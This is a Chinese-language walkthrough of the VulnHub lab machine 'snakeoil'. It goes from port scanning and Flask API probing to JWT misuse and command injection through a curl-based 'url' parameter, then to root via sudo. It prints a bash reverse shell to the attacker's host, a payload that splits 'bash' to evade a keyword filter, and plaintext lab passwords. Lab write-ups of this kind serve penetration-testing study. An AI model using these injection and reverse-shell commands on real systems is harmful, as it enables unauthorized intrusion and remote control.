# 前言

靶机：`digitalworld.local-snakeoil`，IP地址为`192.168.10.11`

攻击：`kali`，IP地址为`192.168.10.6`

`kali`采用`VMware`虚拟机，靶机选择使用`VMware`打开文件，都选择桥接网络

这里官方给的有两种方式，一是直接使用`virtualbox`加载，另一种是通过`VMware`直接加载，也给出了`iso`镜像文件。	

> 文章中涉及的靶机，来源于`vulnhub`官网，想要下载，可自行访问官网下载，或者通过网盘下载

# 主机发现

使用`arp-scan -l`或`netdiscover -r 192.168.10.1/24`扫描

也可以使用`nmap`等工具进行

![](pic-snakeoil\1.jpg)

# 信息收集

## 使用nmap扫描端口

扫描`tcp`端口，并保存于`nmap-tcp`

```shell
nmap -sT 192.168.10.11 --min-rate=1000 -p- -oA nmap-tcp
```

![](pic-snakeoil\2.jpg)

扫描常见的20个`udp`端口，不过这里的端口明显处于`open`的很少

```shell
nmap -sU 192.168.10.11 --top-ports 20 -T4 -oA nmap-udp
```

![](pic-snakeoil\3.jpg)

把前面扫描出的`tcp、udp`端口，进行处理，只取端口号

```shell
grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','
#这里就是包括可能开放的端口都不要，因为是靶机，可能过滤的话，也会无法进一步扫描
ports=22,80,8080,68,69,138,161,631,1434,1900
```

![](pic-snakeoil\4.jpg)

对特定的端口号进行深入探测

```shell
nmap -sV -O -sC -sT 192.168.10.11 -p $ports -oA detail
```

![](pic-snakeoil\5.jpg)

使用脚本检测有无漏洞

```shell
nmap --script=vuln 192.168.10.11 -p $ports -oA vuln
```

![](pic-snakeoil\6.jpg)



## 网站信息探测

访问80端口界面，应该是搭建成功的界面，访问页面源代码，并没有信息泄露

![](pic-snakeoil\7.jpg)

使用`whatweb`和浏览器插件`wappalyzer`进行分析

![](pic-snakeoil\8.jpg)

![9](pic-snakeoil\9.jpg)

使用`gobuster`等目录爆破工具进行测试

```shell
gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.txt,s,.,.html -b 403-404
```

![](pic-snakeoil\10.jpg)

可以看到，扫描并未有内容出现

访问8080端口的界面，这个界面，有点像之前未绑定域名时的界面，不知道是否如此

查看页面源代码，也没有信息泄露

![](pic-snakeoil\11.jpg)

点击进行测试，访问`edit`，就是每个文章的编辑，发现有`delete post`的选项，并且点击后，可以直接就删除这个文章了

![](pic-snakeoil\12.jpg)

不过访问`house rules`时，也是发现了一个人名`patrick`

![](pic-snakeoil\13.jpg)

这里反应很慢，通过浏览器的网络功能，发现请求的`js`可能是来自国外的，所以建议这里自己使用魔法一下。

![](pic-snakeoil\14.jpg)

访问`useful links`，发现其中提到`JWT`认证

![](pic-snakeoil\15.jpg)

使用`gobuster`目录爆破工具，针对`8080`端口的网站进行目录爆破

```shell
gobuster dir -u http://192.168.10.11:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.txt,.sh,.html -b 403-404
```

![](pic-snakeoil\16.jpg)

访问`login`界面，提示当前的`get`方式不行，并且服务器给出回应，可用的方式有两个

![](pic-snakeoil\17.jpg)

那么建议使用`burp`或者`yakit`抓包吧，更改请求类型后，还是没什么东西。改为`post`还有内容，但是`options`后，没有任何东西

![](pic-snakeoil\18.jpg)

访问同样是`405`状态码的`run`，这个更改为`post`后，给出了返回，也就是应该有一个`form`表单，这个表单中输入`url`，其实就是需要知道参数。这个没办法

![](pic-snakeoil\19.jpg)

访问`users`，发现东西了，这里就是出现用户名和密码了

![](pic-snakeoil\20.jpg)



```
$pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040
```

尝试使用`john`进行破解

> `$pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040` 这种形式是使用了 PBKDF2（Password-Based Key Derivation Function 2）算法结合 SHA256 哈希函数进行的密码哈希加密结果。
>
> 具体解释如下：
>
> - `$pbkdf2-sha256$`：表示使用的是 PBKDF2 算法并且哈希函数是 SHA256。PBKDF2 是一种基于密码的密钥派生函数，它通过多次迭代和加盐等操作，增加破解密码的难度，增强安全性。
> - `29000`：这个数字表示迭代次数，即 PBKDF2 算法在计算密钥派生值时对输入密码进行哈希计算的次数。迭代次数越多，破解密码所需的时间和计算资源就越多。
> - `e0/J.V.rVSol5HxPqdW6Nw`：这是盐值（salt），盐是一个随机值，与密码一起参与哈希计算。盐值的作用是使得即使用户使用了相同的密码，其哈希结果也会不同，进一步增加破解的难度。
> - `FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040`：这部分是最终生成的密码哈希值。

这里继续进行总结观察

# 抓包分析以获取shell

这里还是说一下，并非就一定使用`burp`，工具很多

## 使用burp修改数据包

之前抓取的几个界面感觉有搞头，`/login`和`run`和`registration`

###### **访问`registration`**

这里是返回提示“错误的方法”

![](pic-snakeoil\21.jpg)

那么采用POST方式后，提示`username`区域为空

![](pic-snakeoil\22.jpg)

一般对于`registration`都是注册，假设这里一样呢，因为也涉及到用户名。

那么一般都是与表单有关的，所以，尝试进行添加，参数是`username`

这里建议从`burp`的右侧界面进行添加，因为这样`burp`会自动加上`Content-type`请求体的

![](pic-snakeoil\23.jpg)

这里提示`password`参数也没有数据，所以再添加数据`password`

![](pic-snakeoil\24.jpg)

根据返回数据来看，已经成功， 让访问`login`的`api`进行登录，并且给出了一个`token`值，这个肯定有用



###### **访问`login`**

使用刚刚注册成功的进行登录

修改请求方式为`POST`，然后点击后，所需参数与注册时一样，就直接截图参数到位的图片

![](pic-snakeoil\25.jpg)

但是这里登录成功，并没有跳转，所以可能就到这里，还有一个`run`，访问它

###### 访问`run`

但是这里的返回并没有参数，该怎么办呢，仔细观察，或许这是`json`的形式进行传递的

![](pic-snakeoil\26.jpg)

以`json`数据在请求体中进行测试，不过直接测试`127.0.0.1:80`后，无效果

![](pic-snakeoil\27.jpg)

说明还是有一个所谓的参数，一直说提供`url`，是否参数就是`url`呢，测试一下，当然形式上都测试一下，先测试表单的请求，可以看到不行

![](pic-snakeoil\28.jpg)

直接使用`burp`的扩展，更改为`json`形式

![](pic-snakeoil\29.jpg)

返回不一样了，这里要一个密钥，综合来说，目前密钥的形式可能有`patrick`的哈希密码。以及注册用户`snake`给的一个`access_token`，不过这里进行`login`时，是使用注册的用户`snake`，是否需要的就是这个`access_token`呢。

这个`token`，一般都是放置在`cookie`中的，那么直接添加测试，直接在这里发现不行，这个`secret_key`可能不是这两个中的任一个。



###### 访问`secret`

根据名称联想，之前的目录`secret`还没测试，访问测试一下，直接500

![](pic-snakeoil\30.jpg)

内部服务器问题？这里目前有的只有`access_token`以及账户密码，尝试添加`access_token`测试能否访问

![](pic-snakeoil\31.jpg)

还是不行，这不应该啊，我测试多次，无奈，看了一下`wp`。

有点无语，名称是`access_token_cookie`？？？？？？？啊啊啊啊啊啊啊

唉，访问成功，获取到`secret_key`的值`commandexecutionissecret`

![](pic-snakeoil\32.jpg)

直接在`run`中的`json`数据，再添加以一段即可

![](pic-snakeoil\33.jpg)

###### 命令执行

这里可以看到右边的返回，像是统计，这里的`secret_key`是固定的，必须有才能有返回

但是`url`参数的值，并非固定的，尝试修改一下进行测试，只要在引号内修改，任意值的返回都是这个

并且，这里返回中，说不能解析主机`id`，采用的是`curl`

![](pic-snakeoil\35.jpg)

我是否可以猜测，这其实是一个`curl`命令语句，经测试就是类似于这种

![](pic-snakeoil\36.jpg)

所以在`burp`上再测试，发现直接在引号内输入`;id`是不行的，可能在某些符合内吧。想到可以使用反引号 ` `` `这个可以执行的

```shell
"url":"127.0.0.1:80;`id`",
"secret_key":"commandexecutionissecret"
```

![](pic-snakeoil\37.jpg)

相当于可以命令执行，并且这个返回其实可以搞掉，因为是正确的返回，那么直接给它`2>/dev/null`。

反正大差不差，直接命令执行一个反弹`shell`进行测试，直接搞命令不行，感觉可能有过滤等情况发生，那么直接在`kali`中创建一个脚本`shell.sh`，代码如下

```shell
bash -i >& /dev/tcp/192.168.10.6/9999 0>&1
```

然后通过这个把其下载，根据`curl`的命令，加上`-O`参数即可，这里也测试过`php`文件，但是对`php`进行关键字处理了

![](pic-snakeoil\38.jpg)

想办法执行执行这个脚本，测试过，命令执行不能有空格，也就是单个命令可以

经过测试，对关键字`bash`进行了筛选，不能直接有`bash`出现

所以需要进行拼接

```shell
"http://192.168.10.6:8888/shell.sh -O;`a='bas';b='h';$a$b shell.sh`",
```

![](pic-snakeoil\39.jpg)



## 使用postman修改

打开`postman`工具后，直接输入网址地址即可，这里与`burp`不同，这里基本上无需抓包，而是通过修改包然后直接请求的方式

大致情况如下，基本上差不多

![](pic-snakeoil\40.jpg)

![26](pic-snakeoil\41.jpg)

这里就放两张图，不过一定要注意，`postman`与`burp`是不同的，这里使用这个工具也是提醒自己



# 靶机内信息收集

以`patrick`获取到的反弹`shell`，查看当前靶机内的用户，发现只要`patrick`

```shell
ls -l /home
cat /etc/passwd | grep /bin/bash
```

![](pic-snakeoil\42.jpg)

查看网络连接状态

```shell
ip add
ss -antulp
netstat -antulp
```

![](pic-snakeoil\43.jpg)

查看内核版本和系统版本

```shell
uname -a
uanme -r
cat /etc/issue
cat /etc/*release
lsb_release
```

![](pic-snakeoil\44.jpg)

查看以`root`执行的进程

```shell
ps aux | grep root
```



使用`find`寻找一些权限

```shell
find / -perm \o+w 2>/dev/null
find / -perm -4000 -print 2>/dev/null
```

![](pic-snakeoil\45.jpg)

使用`sudo -l`查看，发现两个，一个以`root`执行无需密码的`shutdown`，一个是需要密码，所有都可以

但是这里不知道`patrick`的密码

![](pic-snakeoil\46.jpg)

查看由`python`搭建的`flask`网站配置，该配置文件就在`patrick`的家目录下，路径为`/home/patrick/flask_blog`

查看主文件`app.py`，发现几个可能是密码的东西

![](pic-snakeoil\47.jpg)

当然这个文件中，还涉及到一些防护，是真的对`bash`等关键字进行防护了

![](pic-snakeoil\48.jpg)

尝试以获取的密码进行登录测试

```
snakeoilisnotgoodforcorporations
NOreasonableDOUBTthisPASSWORDisGOOD
```

最终以密码`NOreasonableDOUBTthisPASSWORDisGOOD`登录了`patrick`账户

![](pic-snakeoil\49.jpg)

# 提权

根据前面的`sudo -l`的配置可以知道，这里知道密码后可执行`sudo`一切了

```shell
sudo /bin/bash -p
```

![](pic-snakeoil\50.jpg)

查看`root`主目录下的文件

![](pic-snakeoil\51.jpg)



# 总结

该靶机有以下几点:

1. 对于网站，最好就是在浏览时，借助抓包工具，这样可以分析很多，可以使用`burp`或`yakit`等
2. 对于一些网站中的请求方式，请求方式不同，也会导致返回不同，这个是重点的，还有许多`http`的请求头不同，返回也会不同的
3. 对于`http`协议中的一些东西，一定要了解，这里比如请求体数据格式，请求头`cookie`，`content-type`等等
4. `python`搭建的网站也是要了解的，这里的`flask`也是有很多漏洞的，具体可以百度搜索一下。





